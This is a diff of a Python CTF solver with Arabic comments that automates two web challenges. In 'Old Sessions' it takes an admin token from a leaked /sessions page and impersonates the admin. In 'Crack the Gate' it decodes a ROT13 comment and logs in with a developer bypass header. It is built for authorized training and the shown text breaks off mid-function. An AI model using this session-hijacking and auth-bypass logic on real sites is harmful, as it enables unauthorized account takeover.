@@ -1,28 +1,24 @@
 # -*- coding: utf-8 -*-
 """
-CTF Falcon - Web Session Audit
+CTF Falcon - Web Session Audit  (v2.3.0)
 ==============================================================================
-وحدة مستقلة (بدون أي مكتبات خارجية) تُكمل مسار تحدي "Old Sessions"
-وتستخرج العلم تلقائيًا، مع حفظ سلسلة الاستجابات كاملة وتحليل صحيح للكوكيز.
+موزِّع محلِّلات لتحديات الويب التعليمية المصرّح بها. يفحص الصفحة أولًا (recon)،
+ثم يختار المحلل المناسب حسب الأدلة الفعلية فقط:
 
-Standalone module (Python stdlib only) that completes the "Old Sessions"
-web-exploitation challenge path on an *authorized, educational* CTF instance
-and extracts the flag, while preserving the full response chain and doing
-correct cookie analysis.
+  - Old Sessions     : يعتمد على تحويل / → /login + كوكي جلسة، ثم /register
+                       و/sessions — وكل خطوة مشروطة بدليل من الاستجابة السابقة.
+  - Crack the Gate   : تعليق ROT13 يكشف ترويسة مطوّر + مسار دخول JSON بالبريد.
+  - غير معروف        : يعرض المكتشفات الفعلية دون تنفيذ أي مسار تلقائيًا.
 
-Design goals (مطابقة لطلب المشروع):
-  - لا تثبيت لاسم المضيف/المنفذ/قيم الجلسة: كل شيء مشتق من الرابط المُدخل.
-  - عدم متابعة التحويلات تلقائيًا: كل استجابة تُطلب وتُحفظ على حدة، لأن
-    الاستجابات الوسيطة تحمل أدلة (الصفحة الرئيسية تُنشئ كوكي، وصفحة الدخول تحذفها).
-  - تصحيح تحليل الكوكيز محفوظ: Max-Age <= 0 = طلب حذف، لا "دائمة".
-  - نمط العلم قابل للتهيئة (افتراضيًا picoCTF{...} وأنماط شائعة أخرى).
+مبادئ ثابتة:
+  - لا تثبيت لمضيف/منفذ/علم. كل شيء من رابط الطالب.
+  - قفل الأصل: كل الطلبات على أصل التحدي نفسه؛ التحويل لمضيف آخر يُرفض.
+  - لا اتباع تلقائي للتحويلات: كل استجابة تُسجّل على حدة.
+  - تصحيح الكوكيز محفوظ: Max-Age <= 0 = طلب حذف.
+  - لا تخمين كلمات مرور ولا مسح مسارات. الأدلة المتاحة فقط.
+  - لا ادعاء نجاح أو علمًا عند الفشل؛ ولا عرض لكلمات المرور أو قيم الجلسات.
 
-Public API:
-    run_audit(url, **options) -> dict     # يُستدعى من falcon_local.py
-    analyze_set_cookie(raw) -> dict        # تحليل كوكي واحد
-
-CLI:
-    python web_session_audit.py http://host:port/
+نقطة الدخول العامة: run_audit(url, **options) -> dict  (يستدعيها falcon_local.py)
 ==============================================================================
 """
 from __future__ import annotations
@@ -33,51 +29,43 @@ import ssl
 import sys
 import http.client
 import secrets
+import codecs
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin
 
-__version__ = "2.2.0"
+__version__ = "2.3.0"
 
 # --------------------------------------------------------------------------- #
-#  إعدادات افتراضية                                                            #
-# --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
+    r"academy\{[^}]+\}",          # صيغة منصة Cylab Academy
     r"picoCTF\{[^}]+\}",
     r"flag\{[^}]+\}",
     r"FLAG\{[^}]+\}",
     r"CTF\{[^}]+\}",
-    # نمط عام: بادئة قصيرة ثم {...} — يُستخدم كملاذ أخير
-    r"[A-Za-z0-9_]{2,12}\{[^}]{3,}\}",
+    r"[A-Za-z0-9_]{2,12}\{[^}]{3,}\}",  # نمط عام (ملاذ أخير)
 ]
 DEFAULT_TIMEOUT = 15
+MAX_BODY = 2 * 1024 * 1024
+TEST_PASSWORD = "falcon-nonsensitive-test"   # كلمة مرور تجريبية، لا تُسجَّل أبدًا
+DEFAULT_ACADEMY_EMAIL = "ctf-player@cylabacademy.org"
 USER_AGENT = f"CTF-Falcon-WebAudit/{__version__} (educational; authorized-CTF-only)"
 
 
 # --------------------------------------------------------------------------- #
-#  عميل HTTP بسيط لا يتبع التحويلات ويحفظ الكوكيز يدويًا                        #
+#  عميل HTTP: لا يتبع التحويلات، يقفل الأصل، يحفظ الكوكيز يدويًا                 #
 # --------------------------------------------------------------------------- #
 class HttpClient:
-    """
-    عميل HTTP خفيف مبني على http.client.
-    - لا يتبع أي تحويل (302/301/...) تلقائيًا.
-    - يحفظ Set-Cookie متعددة ويطبّق دلالات الحذف بشكل صحيح.
-    """
-
     def __init__(self, timeout=DEFAULT_TIMEOUT, insecure_tls=False):
         self.timeout = timeout
         self.insecure_tls = insecure_tls
         self.cookies: dict[str, str] = {}
+        self.origin = None
 
-    # -- كوكيز -------------------------------------------------------------- #
     def cookie_header(self) -> str:
         return "; ".join(f"{k}={v}" for k, v in self.cookies.items())
 
     def apply_set_cookies(self, analyzed_cookies: list[dict]) -> list[str]:
-        """
-        يطبّق نتائج تحليل Set-Cookie على مخزن الكوكيز (إضافة/تحديث/حذف)،
-        ويعيد قائمة رسائل عربية توضح ما جرى (للأدلة التعليمية).
-        """
         notes = []
         for c in analyzed_cookies:
             name = c["name"]
@@ -86,28 +74,29 @@ class HttpClient:
                     del self.cookies[name]
                     notes.append(f"حُذفت الكوكي «{name}» بناءً على طلب الخادم (Max-Age<=0 أو Expires ماضٍ).")
                 else:
-                    notes.append(f"طلب الخادم حذف كوكي «{name}» غير موجودة أصلًا لدينا.")
+                    notes.append(f"طلب الخادم حذف كوكي «{name}» غير موجودة لدينا.")
             else:
                 self.cookies[name] = c["value"]
                 notes.append(f"خُزّنت/حُدّثت الكوكي «{name}».")
         return notes
 
-    # -- طلب ---------------------------------------------------------------- #
     def request(self, method: str, url: str, body: str | None = None,
                 extra_headers: dict | None = None) -> dict:
         parts = urlsplit(url)
         scheme = parts.scheme or "http"
         host = parts.hostname
         port = parts.port or (443 if scheme == "https" else 80)
-        origin=(scheme,host,port)
-        if parts.username or parts.password or scheme not in ("http","https"):
-            raise ValueError("Invalid challenge URL")
-        if hasattr(self,"origin") and self.origin!=origin:
-            raise ValueError("Cross-origin challenge request blocked")
-        self.origin=origin
         path = parts.path or "/"
         if parts.query:
             path += "?" + parts.query
+
+        # قفل الأصل: لا مصادقة مضمّنة، ولا انتقال لمضيف مختلف
+        origin = (scheme, host, port)
+        if parts.username or parts.password or scheme not in ("http", "https"):
+            raise ValueError("Invalid challenge URL")
+        if self.origin is not None and self.origin != origin:
+            raise ValueError("Cross-origin challenge request blocked")
+        self.origin = origin
 
         if scheme == "https":
             ctx = ssl.create_default_context()
@@ -120,7 +109,7 @@ class HttpClient:
 
         headers = {
             "User-Agent": USER_AGENT,
-            "Accept": "text/html,application/xhtml+xml,*/*",
+            "Accept": "text/html,application/xhtml+xml,application/json,*/*",
             "Connection": "close",
         }
         if self.cookies:
@@ -129,14 +118,14 @@ class HttpClient:
             headers["Content-Type"] = "application/x-www-form-urlencoded"
             headers["Content-Length"] = str(len(body.encode("utf-8")))
         if extra_headers:
-            headers.update(extra_headers)
+            headers.update(extra_headers)   # يسمح بتجاوز Content-Type لـ JSON
 
         try:
             conn.request(method, path, body=body, headers=headers)
             resp = conn.getresponse()
-            raw_headers = resp.getheaders()          # يحفظ Set-Cookie المتعددة
-            raw_body = resp.read(2*1024*1024+1)
-            if len(raw_body)>2*1024*1024:
+            raw_headers = resp.getheaders()
+            raw_body = resp.read(MAX_BODY + 1)
+            if len(raw_body) > MAX_BODY:
                 raise ValueError("Response exceeds 2 MB")
             status = resp.status
             reason = resp.reason
@@ -146,25 +135,20 @@ class HttpClient:
         text = raw_body.decode("utf-8", errors="replace")
         set_cookie_raw = [v for (k, v) in raw_headers if k.lower() == "set-cookie"]
         location = next((v for (k, v) in raw_headers if k.lower() == "location"), None)
+        ctype = next((v for (k, v) in raw_headers if k.lower() == "content-type"), "")
 
         return {
-            "method": method,
-            "url": url,
-            "request_cookies": dict(self.cookies),
-            "status": status,
-            "reason": reason,
-            "location": location,
-            "set_cookie_raw": set_cookie_raw,
-            "headers": raw_headers,
-            "body": text,
+            "method": method, "url": url, "request_cookies": dict(self.cookies),
+            "status": status, "reason": reason, "location": location,
+            "content_type": ctype, "set_cookie_raw": set_cookie_raw,
+            "headers": raw_headers, "body": text,
         }
 
 
 # --------------------------------------------------------------------------- #
-#  تحليل الكوكيز (التصحيح المطلوب محفوظ هنا)                                    #
+#  تحليل الكوكيز (تصحيح Max-Age محفوظ)                                          #
 # --------------------------------------------------------------------------- #
 def _parse_cookie_attrs(raw: str):
-    """يفصل الكوكي إلى (name, value, attrs)."""
     segments = [s.strip() for s in raw.split(";") if s.strip() != ""]
     if not segments:
         return "", "", {}
@@ -184,25 +168,13 @@ def _parse_cookie_attrs(raw: str):
 
 
 def analyze_set_cookie(raw: str) -> dict:
-    """
-    يحلّل ترويسة Set-Cookie واحدة ويحدد النية (set / deletion) بشكل صحيح.
-
-    القواعد (كما طُلب):
-      * Max-Age <= 0  => طلب حذف الكوكي (وليست "دائمة").
-      * عند غياب Max-Age، تاريخ Expires ماضٍ => انتهاء صلاحية/حذف.
-      * تاريخ انتهاء بعيد وحده لا يثبت أن جلسة المصادقة لا تنتهي على الخادم.
-      * غياب HttpOnly / Secure / SameSite ملاحظات هاردنينج منفصلة، ولا يثبت
-        أيٌّ منها وحده إمكانية استخراج العلم.
-    """
     name, value, attrs = _parse_cookie_attrs(raw)
     notes: list[str] = []
     intent = "set"
     lifetime_seconds = None
     expires_dt = None
-
     now = datetime.now(timezone.utc)
 
-    # 1) Max-Age له الأولوية على Expires حسب المواصفة
     if "max-age" in attrs and attrs["max-age"] is not True:
         try:
             ma = int(str(attrs["max-age"]).strip())
@@ -215,7 +187,6 @@ def analyze_set_cookie(raw: str) -> dict:
         except ValueError:
             notes.append("قيمة Max-Age غير صالحة؛ تم تجاهلها.")
 
-    # 2) Expires (يُنظر إليه إذا لم يحسم Max-Age الأمر)
     if "expires" in attrs and attrs["expires"] is not True:
         try:
             expires_dt = parsedate_to_datetime(str(attrs["expires"]))
@@ -233,43 +204,28 @@ def analyze_set_cookie(raw: str) -> dict:
         except (TypeError, ValueError):
             notes.append("تعذّر تحليل قيمة Expires؛ تم تجاهلها.")
 
-    # 3) كوكي جلسة (لا Max-Age ولا Expires)
     if intent == "set" and lifetime_seconds is None and expires_dt is None:
         notes.append("لا Max-Age ولا Expires: كوكي جلسة تُحذف بإغلاق المتصفح.")
-
-    # 4) قيمة فارغة + نية حذف = تأكيد إزالة
     if intent == "deletion" and value == "":
         notes.append("القيمة فارغة مع نية الحذف: إزالة واضحة للكوكي.")
 
-    # 5) ملاحظات هاردنينج منفصلة (لا تُثبت وحدها استخراج العلم)
-    flags = {
-        "httponly": "httponly" in attrs,
-        "secure": "secure" in attrs,
-        "samesite": attrs.get("samesite") if "samesite" in attrs else None,
-    }
     hardening = []
-    if not flags["httponly"]:
+    if "httponly" not in attrs:
         hardening.append("HttpOnly غائبة: الكوكي مقروءة بـ JavaScript (ملاحظة منفصلة).")
-    if not flags["secure"]:
+    if "secure" not in attrs:
         hardening.append("Secure غائبة: قد تُرسل عبر HTTP غير المشفّر (ملاحظة منفصلة).")
-    if flags["samesite"] is None:
+    if "samesite" not in attrs:
         hardening.append("SameSite غير محددة: اعتبارات CSRF (ملاحظة منفصلة).")
     if hardening:
         hardening.append("أيٌّ من هذه وحده لا يثبت إمكانية استخراج العلم.")
 
     return {
-        "raw": raw,
-        "name": name,
-        "value": value,
-        "attrs": attrs,
-        "intent": intent,                    # "set" | "deletion"
-        "lifetime_seconds": lifetime_seconds,
+        "raw": raw, "name": name, "value": value, "attrs": attrs,
+        "intent": intent, "lifetime_seconds": lifetime_seconds,
         "expires": expires_dt.isoformat() if expires_dt else None,
-        "httponly": flags["httponly"],
-        "secure": flags["secure"],
-        "samesite": flags["samesite"],
-        "notes_ar": notes,
-        "hardening_ar": hardening,
+        "httponly": "httponly" in attrs, "secure": "secure" in attrs,
+        "samesite": attrs.get("samesite") if "samesite" in attrs else None,
+        "notes_ar": notes, "hardening_ar": hardening,
     }
 
 
@@ -278,19 +234,82 @@ def analyze_response_cookies(resp: dict) -> list[dict]:
 
 
 # --------------------------------------------------------------------------- #
-#  أدوات تحليل صفحات التحدي                                                     #
+#  أدوات فحص الصفحة (recon)                                                     #
 # --------------------------------------------------------------------------- #
+def rot13(s: str) -> str:
+    return codecs.encode(s, "rot_13")
+
+
+_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
+_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
+_FETCH_RE = re.compile(r"""fetch\(\s*['"]([^'"]+)['"]""", re.I)
+_INPUT_NAME_RE = re.compile(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
+_FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
+_ACTION_RE = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.I)
+_FMETHOD_RE = re.compile(r'\bmethod\s*=\s*["\']([^"\']*)["\']', re.I)
+
+# ترويسة مطوّر داخل نص التعليق، مثل:  header "X-Dev-Access: yes"  أو  X-Foo: bar
+_HEADER_HINT_RES = [
+    re.compile(r'header[^"\']*["\']\s*([A-Za-z][A-Za-z0-9\-]*)\s*:\s*([^"\'\s]+)', re.I),
+    re.compile(r'\b(X-[A-Za-z0-9\-]+)\s*:\s*([A-Za-z0-9_\-]+)', re.I),
+]
+
+
+def extract_comments(html: str) -> list[str]:
+    return [m.group(1).strip() for m in _COMMENT_RE.finditer(html)]
+
+
+def extract_emails(text: str) -> list[str]:
+    seen, out = set(), []
+    for m in _EMAIL_RE.finditer(text):
+        e = m.group(0)
+        if e not in seen:
+            seen.add(e); out.append(e)
+    return out
+
+
 def find_form_fields(html: str) -> list[str]:
-    """أسماء حقول <input name="...">."""
-    return re.findall(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', html, re.I)
+    return _INPUT_NAME_RE.findall(html)
+
+
+def find_forms(html: str) -> list[dict]:
+    forms = []
+    for m in _FORM_RE.finditer(html):
+        attrs, inner = m.group(1), m.group(2)
+        action = (_ACTION_RE.search(attrs).group(1) if _ACTION_RE.search(attrs) else "")
+        method = (_FMETHOD_RE.search(attrs).group(1).upper() if _FMETHOD_RE.search(attrs) else "GET")
+        forms.append({"action": action, "method": method, "fields": _INPUT_NAME_RE.findall(inner)})
+    return forms
+
+
+def extract_login_fetch(html: str) -> dict | None:
+    """
+    يحلّل استدعاءات fetch في السكربتات الداخلية ويعيد أول مسار دخول
+    يرسل JSON يحتوي email/password (أو ما يشبهه).
+    """
+    for m in _FETCH_RE.finditer(html):
+        path = m.group(1)
+        window = html[m.end(): m.end() + 500]
+        low = window.lower()
+        is_json = "application/json" in low or "json.stringify" in low
+        if re.search(r"method\s*:\s*['\"]post['\"]", low):
+            method = "POST"
+        elif "json.stringify" in low:
+            method = "POST"
+        else:
+            method = "GET"
+        fields = []
+        for f in ("email", "password", "username", "user", "pass"):
+            if re.search(r"['\"]?" + f + r"['\"]?\s*:", low) or re.search(r"(?:\{|,)\s*" + f + r"\s*(?=,|\})", low):
+                fields.append(f)
+        reads = [k for k in ("success", "flag", "token", "error")
+                 if re.search(r"\.\s*" + k + r"\b", low) or ("'" + k + "'" in low) or ('"' + k + '"' in low)]
+        if ("email" in fields or "username" in fields) and ("password" in fields or "pass" in fields):
+            return {"path": path, "method": method or "POST", "json": is_json, "fields": fields, "reads": reads}
+    return None
 
 
 def find_sessions_hint(html: str) -> str | None:
-    """
-    يبحث عن المسار المُلمّح إليه في التعليقات، مثل:
-    'Hey I found a strange page at /sessions'
-    ولا يثبّت /sessions إجباريًا.
-    """
     m = re.search(r'strange page at\s+(/[\w\-/\.]*)', html, re.I)
     if m:
         return m.group(1)
@@ -302,21 +321,13 @@ def find_sessions_hint(html: str) -> str | None:
     return None
 
 
-_SESSION_LINE_RE = re.compile(r'session\s*:\s*([^\s,<]+)\s*,\s*(\{.*?\}|.+?)(?:</p>|<br|\n|$)',
-                              re.I | re.S)
+_SESSION_LINE_RE = re.compile(r'session\s*:\s*([^\s,<]+)\s*,\s*(\{.*?\}|.+?)(?:</p>|<br|\n|$)', re.I | re.S)
 
 
 def parse_sessions_dump(html: str) -> list[dict]:
-    """
-    يحلّل صفحة /sessions إلى قائمة إدخالات:
-      { "token": "...", "decoded": "{'_permanent': True, ...}" }
-    يعمل مع الصيغة: "1) session:TOKEN, {'_permanent': ...}"
-    """
     entries = []
     for m in _SESSION_LINE_RE.finditer(html):
-        token = m.group(1).strip().strip(",")
-        decoded = m.group(2).strip()
-        entries.append({"token": token, "decoded": decoded})
+        entries.append({"token": m.group(1).strip().strip(","), "decoded": m.group(2).strip()})
     return entries
 
 
@@ -325,21 +336,19 @@ _ADMIN_HINTS = [
     (re.compile(r"\badmin\s*=\s*true", re.I), 5),
     (re.compile(r"['\"](?:username|user|name)['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
     (re.compile(r"['\"]role['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
-    (re.compile(r"\badmin\b", re.I), 1),
     (re.compile(r"['\"]is_admin['\"]\s*:\s*true", re.I), 5),
+    (re.compile(r"\badmin\b", re.I), 1),
 ]
 
 
 def pick_admin_entry(entries: list[dict], own_token: str | None) -> dict | None:
-    """يختار الإدخال الأرجح أنه جلسة المشرف بالاعتماد على محتوى القاموس المفكوك."""
     best, best_score = None, 0
     for e in entries:
         if own_token and e["token"] == own_token:
-            continue  # ليست جلستنا العادية
+            continue
         score = sum(w for rx, w in _ADMIN_HINTS if rx.search(e["decoded"]))
         if score > best_score:
             best, best_score = e, score
-    # ملاذ أخير: إن لم نجد إشارة "admin" واضحة، اختر أول جلسة ليست جلستنا
     if best is None:
         for e in entries:
             if not own_token or e["token"] != own_token:
@@ -348,178 +357,393 @@ def pick_admin_entry(entries: list[dict], own_token: str | None) -> dict | None:
 
 
 def extract_flag(bodies: list[tuple[str, str]], patterns: list[str]) -> tuple[str | None, str | None]:
-    """
-    يبحث عن العلم عبر عدة أجسام استجابة بالترتيب.
-    bodies: قائمة (label, body). يعيد (flag, source_label).
-    """
     compiled = [re.compile(p) for p in patterns]
     for label, body in bodies:
         for rx in compiled:
-            m = rx.search(body)
-            if m:
-                return m.group(0), label
+            mm = rx.search(body)
+            if mm:
+                return mm.group(0), label
     return None, None
 
 
+def _mask(value: str | None, keep: int = 4) -> str | None:
+    if not value:
+        return value
+    return value[:keep] + "…" if len(value) > keep else "…"
+
+
 # --------------------------------------------------------------------------- #
-#  المدقّق الرئيسي: مسار Old Sessions كاملًا                                    #
+#  المُسجِّل: يسجّل كل استجابة مع تحليل الكوكيز، ويُخفي قيم الجلسات في السجل      #
 # --------------------------------------------------------------------------- #
-def run_audit(url: str,
-              flag_patterns: list[str] | None = None,
-              timeout: int = DEFAULT_TIMEOUT,
-              insecure_tls: bool = False,
-              demonstrate_register_requirement: bool = True,
-              username: str | None = None,
-              password: str | None = None) -> dict:
-    """
-    يشغّل مسار تحدي Old Sessions على رابط Instance مُصرّح به تعليميًا،
-    ويعيد قاموسًا يشمل سلسلة الاستجابات، الأدلة، والعلم المستخرج.
-
-    ملاحظة أخلاقية: هذه الأداة للتدريب على تحديات CTF المصرّح بها فقط.
-    """
-    flag_patterns = flag_patterns or DEFAULT_FLAG_PATTERNS
-    if not re.match(r"^https?://", url, re.I):
-        url = "http://" + url
-    base = url if url.endswith("/") else url + "/"
-
-    # بيانات حساب تجريبي عشوائية (لا تُثبَّت في الكود)
-    username = username or ("falcon_" + secrets.token_hex(4))
-    password = password or secrets.token_hex(8)
-
-    client = HttpClient(timeout=timeout, insecure_tls=insecure_tls)
-    steps: list[dict] = []
-    warnings: list[str] = []
-    bodies_for_flag: list[tuple[str, str]] = []
-
-    def record(resp: dict, note_lines: list[str]) -> dict:
+def _make_recorder(client, steps, bodies_for_flag):
+    def record(resp, note_lines):
         analyzed = analyze_response_cookies(resp)
         jar_notes = client.apply_set_cookies(analyzed)
+        masked_req = {k: _mask(v) for k, v in resp["request_cookies"].items()}  # لا قيم كاملة في السجل
         step = {
             "n": len(steps) + 1,
-            "method": resp["method"],
-            "url": resp["url"],
-            "request_cookies": resp["request_cookies"],
-            "status": resp["status"],
-            "reason": resp["reason"],
-            "location": resp["location"],
-            "set_cookies": analyzed,
-            "body_snippet": resp["body"][:600],
+            "method": resp["method"], "url": resp["url"],
+            "request_cookies": masked_req,
+            "status": resp["status"], "reason": resp["reason"], "location": resp["location"],
+            "set_cookies": analyzed, "body_snippet": resp["body"][:600],
             "notes_ar": note_lines + jar_notes,
         }
         steps.append(step)
         bodies_for_flag.append((f"step{step['n']}:{resp['method']} {urlsplit(resp['url']).path}", resp["body"]))
         return step
+    return record
 
-    explanation: list[str] = []
 
-    # (1) الصفحة الرئيسية دون تسجيل دخول — نتوقع 302 إلى /login وإنشاء كوكي
-    r1 = client.request("GET", base)
-    record(r1, ["طلب الصفحة الرئيسية دون جلسة: نتوقع تحويلًا إلى /login وإنشاء كوكي جلسة."])
-    explanation.append("1) الصفحة الرئيسية تُنشئ كوكي جلسة (غالبًا بتاريخ انتهاء بعيد) ثم تُحوّل إلى /login.")
-
-    login_url = urljoin(base, r1["location"] or "/login")
-
-    # (2) صفحة /login — نتوقع 200 وحذف الكوكي (الدليل الذي يخفيه اتباع التحويل)
-    r2 = client.request("GET", login_url)
-    s2 = record(r2, ["صفحة /login: نتوقع 200 مع طلب حذف كوكي الجلسة (Max-Age=0)."])
-    explanation.append("2) صفحة /login تحذف كوكي الجلسة (Max-Age=0). "
-                       "لهذا لا نتبع التحويلات تلقائيًا: الحذف دليل يظهر فقط في الاستجابة الوسيطة.")
-
-    # (3) صفحة /register واكتشاف الحقول
-    register_url = urljoin(base, "/register")
-    r3 = client.request("GET", register_url)
-    reg_fields = find_form_fields(r3["body"])
-    record(r3, [f"صفحة /register: الحقول المكتشفة = {reg_fields or 'غير معروفة'}."])
-
-    # (اختياري تعليميًا) إثبات أن conf_password مطلوب: إرسال ناقص يُعيد 400
-    if demonstrate_register_requirement:
-        r3b = client.request("POST", register_url,
-                             body=urlencode({"username": username, "password": password}))
-        record(r3b, ["إثبات المتطلب: إرسال username+password فقط (بدون conf_password) — نتوقع 400."])
-        if r3b["status"] != 400:
-            warnings.append("لم يُعِد التسجيل الناقص 400 كما في مثالنا؛ قد يختلف هذا الـ Instance.")
-
-    # (4) تسجيل صحيح مع conf_password — نتوقع تحويلًا إلى /login
-    reg_body = urlencode({"username": username, "password": password, "conf_password": password})
-    r4 = client.request("POST", register_url, body=reg_body)
-    record(r4, ["تسجيل صحيح مع conf_password: نتوقع 302 إلى /login."])
-    explanation.append("3) أنشأنا حسابًا تجريبيًا (conf_password مطلوب، وإلا 400).")
-
-    # (5) تسجيل الدخول — نتوقع 302 إلى / وإنشاء كوكي جلسة طويلة الصلاحية
-    login_post_url = urljoin(base, "/login")
-    r5 = client.request("POST", login_post_url,
-                        body=urlencode({"username": username, "password": password}))
-    record(r5, ["تسجيل الدخول: نتوقع 302 إلى / وكوكي جلسة طويلة."])
-    own_token = client.cookies.get("session")
-    explanation.append("4) سجّلنا الدخول وحصلنا على كوكي جلسة طويلة الصلاحية للحساب التجريبي.")
-
-    # (6) الصفحة الرئيسية بعد الدخول — نبحث عن التلميح إلى /sessions
-    r6 = client.request("GET", base)
-    hint = find_sessions_hint(r6["body"])
-    record(r6, [f"الصفحة الرئيسية بعد الدخول: التلميح المكتشف = {hint or 'غير موجود'}."])
-    explanation.append(f"5) الصفحة الرئيسية تكشف تلميحًا لصفحة مخفية: {hint or '/sessions'}.")
-
-    sessions_url = urljoin(base, hint or "/sessions")
-
-    # (7) صفحة /sessions — تسريب جلسات الخادم بما فيها جلسة المشرف
-    r7 = client.request("GET", sessions_url)
-    record(r7, ["صفحة /sessions: نتوقع تسريب قائمة جلسات الخادم."])
-    entries = parse_sessions_dump(r7["body"])
-    admin = pick_admin_entry(entries, own_token)
-    explanation.append(f"6) صفحة {hint or '/sessions'} تسرّب جلسات الخادم "
-                       f"(عدد الإدخالات: {len(entries)})، ومنها جلسة المشرف.")
-
-    admin_token = admin["token"] if admin else None
-    result_flag = None
-    flag_source = None
-
-    if not admin_token:
-        warnings.append("لم أستطع تحديد جلسة المشرف من صفحة /sessions؛ راجِع body_snippet للخطوة.")
-    else:
-        # (8) انتحال جلسة المشرف: نضع كوكي session = رمز المشرف ثم نطلب /
-        client.cookies["session"] = admin_token
-        r8 = client.request("GET", base)
-        record(r8, ["انتحال جلسة المشرف: ضبط كوكي session على رمز المشرف ثم طلب /."])
-        explanation.append("7) استبدلنا كوكي جلستنا برمز جلسة المشرف المسرّب، فأصبحنا مشرفين.")
-
-        # قد يظهر العلم في / (كمشرف) أو مباشرة في تفريغ /sessions
-        result_flag, flag_source = extract_flag(bodies_for_flag, flag_patterns)
-        if result_flag:
-            explanation.append(f"8) استُخرج العلم من {flag_source}.")
-
-    if not result_flag:
-        # محاولة أخيرة: ابحث في كل الأجسام (قد يكون العلم داخل تفريغ /sessions)
-        result_flag, flag_source = extract_flag(bodies_for_flag, flag_patterns)
-        if result_flag:
-            explanation.append(f"8) استُخرج العلم من {flag_source}.")
-
-    success = result_flag is not None
-
+def _base_result(origin, challenge, analyzer, recognized):
     return {
-        "tool": "CTF Falcon - Web Session Audit",
-        "version": __version__,
-        "challenge": "Old Sessions (Web Exploitation)",
-        "target": base,
-        "started_at": datetime.now(timezone.utc).isoformat(),
-        "success": success,
-        "flag": result_flag,
-        "flag_source": flag_source,
-        "test_account": {"username": username},   # كلمة المرور لا تُعاد
-        "discovered": {
-            "login_url": login_url,
-            "register_fields": reg_fields,
-            "sessions_hint": hint,
-            "sessions_url": sessions_url,
-            "sessions_count": len(entries),
-            "own_session_token": own_token,
-            "admin_session_token": admin_token,
-            "admin_session_decoded": admin["decoded"] if admin else None,
-        },
-        "steps": steps,
-        "explanation_ar": explanation,
-        "warnings": warnings,
+        "tool": "CTF Falcon - Web Session Audit", "version": __version__,
+        "challenge": challenge, "analyzer": analyzer, "recognized": recognized,
+        "target": origin, "started_at": datetime.now(timezone.utc).isoformat(),
+        "success": False, "flag": None, "flag_source": None,
+        "steps": [], "explanation_ar": [], "warnings": [], "discovered": {},
         "note": "أداة تعليمية لتحديات CTF المصرّح بها فقط؛ لا تُرسل العلم تلقائيًا.",
     }
+
+
+# --------------------------------------------------------------------------- #
+#  الفحص الأولي (recon)                                                         #
+# --------------------------------------------------------------------------- #
+def do_recon(client, origin, record) -> dict:
+    r = client.request("GET", origin)
+    record(r, ["فحص الصفحة: قراءة التعليقات والنماذج وطلبات fetch."])
+    html = r["body"]
+    decoded = [{"raw": c, "rot13": rot13(c)} for c in extract_comments(html)]
+    return {
+        "resp": r, "html": html,
+        "decoded_comments": decoded,
+        "emails": extract_emails(html),
+        "forms": find_forms(html),
+        "login_fetch": extract_login_fetch(html),
+    }
+
+
+# --------------------------------------------------------------------------- #
+#  كشف الأنماط                                                                   #
+# --------------------------------------------------------------------------- #
+def _find_dev_header(decoded_comments):
+    """يبحث عن ترويسة مطوّر داخل التعليقات (بعد ROT13 أو خامًا)."""
+    for c in decoded_comments:
+        for text_kind in ("rot13", "raw"):
+            text = c[text_kind]
+            for rx in _HEADER_HINT_RES:
+                m = rx.search(text)
+                if m:
+                    name, val = m.group(1), m.group(2)
+                    return ({"name": name, "value": val},
+                            c["raw"],
+                            c["rot13"] if text_kind == "rot13" else c["raw"])
+    return None, None, None
+
+
+def detect_crack_the_gate(recon):
+    dev_header, comment_raw, comment_decoded = _find_dev_header(recon["decoded_comments"])
+    if not dev_header:
+        return None
+    lf = recon["login_fetch"]
+    login_path, method, is_json, fields = None, "POST", True, []
+    if lf:
+        login_path, method, is_json, fields = lf["path"], lf["method"], lf["json"], lf["fields"]
+    else:
+        for f in recon["forms"]:
+            if "email" in f["fields"] and f["action"]:
+                login_path, method, is_json, fields = f["action"], f["method"], False, f["fields"]
+                break
+    if not login_path:
+        return None
+    return {
+        "dev_header": dev_header, "comment_raw": comment_raw, "comment_decoded": comment_decoded,
+        "login_path": login_path, "method": method, "json": is_json, "fields": fields,
+    }
+
+
+def detect_old_sessions(recon) -> bool:
+    r = recon["resp"]
+    if r["status"] not in (301, 302, 303, 307, 308):
+        return False
+    if "/login" not in (r["location"] or ""):
+        return False
+    return any(c["name"] == "session" and c["intent"] == "set"
+               for c in analyze_response_cookies(r))
+
+
+# --------------------------------------------------------------------------- #
+#  محلل Crack the Gate                                                          #
+# --------------------------------------------------------------------------- #
+def solve_crack_the_gate(client, origin, recon, ev, steps, bodies, record,
+                         flag_patterns, opts) -> dict:
+    res = _base_result(origin, "Crack the Gate", "crack-the-gate", recognized=True)
+    res["steps"] = steps
+    warn = res["warnings"]; expl = res["explanation_ar"]
+
+    email = opts.get("email") or next((e for e in recon["emails"] if "cylabacademy" in e.lower()),
+                                      None) or (recon["emails"][0] if recon["emails"] else DEFAULT_ACADEMY_EMAIL)
+
+    expl.append(f"التعليق في الصفحة مُرمّز بـ ROT13؛ بعد فكّه: «{ev['comment_decoded']}».")
+    expl.append(f"دلّ التعليق على ترويسة مطوّر تتجاوز البوابة: {ev['dev_header']['name']}: {ev['dev_header']['value']}.")
+
+    login_url = urljoin(origin, ev["login_path"])
+    headers = {ev["dev_header"]["name"]: ev["dev_header"]["value"]}
+    if ev["json"]:
+        headers["Content-Type"] = "application/json"
+        body = json.dumps({"email": email, "password": TEST_PASSWORD})
+    else:
+        body = urlencode({"email": email, "password": TEST_PASSWORD})
+
+    expl.append(f"أرسلنا طلب دخول {'JSON' if ev['json'] else 'نموذجي'} إلى {ev['login_path']} "
+                f"بالبريد {email} وبالترويسة المكتشفة (كلمة مرور تجريبية غير محفوظة).")
+
+    try:
+        r = client.request(ev["method"] or "POST", login_url, body=body, extra_headers=headers)
